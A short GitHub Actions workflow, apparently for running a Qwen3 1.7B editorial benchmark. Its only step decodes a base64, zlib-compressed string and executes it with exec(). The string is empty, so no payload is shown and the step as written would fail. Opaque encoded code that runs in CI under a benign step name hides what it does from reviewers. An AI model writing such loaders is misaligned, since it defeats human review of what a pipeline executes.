name: Qwen editorial benchmark 24
on:
  push:
    branches:
      - verification/qwen-editorial-benchmark-20260906g
    paths:
      - .github/workflows/qwen-editorial-benchmark-24.yml
permissions:
  contents: read
jobs:
  benchmark:
    runs-on: windows-2025
    timeout-minutes: 30
    steps:
      - name: Run pinned Qwen3 1.7B editorial benchmark
        shell: python
        env:
          PYTHONUTF8: "1"
          PYTHONIOENCODING: "utf-8"
        run: |
          import base64,zlib
          data=''
          code=zlib.decompress(base64.b64decode(data)).decode('utf-8')
          exec(compile(code,'<qwen-editorial-benchmark>','exec'),{'__name__':'__main__'})
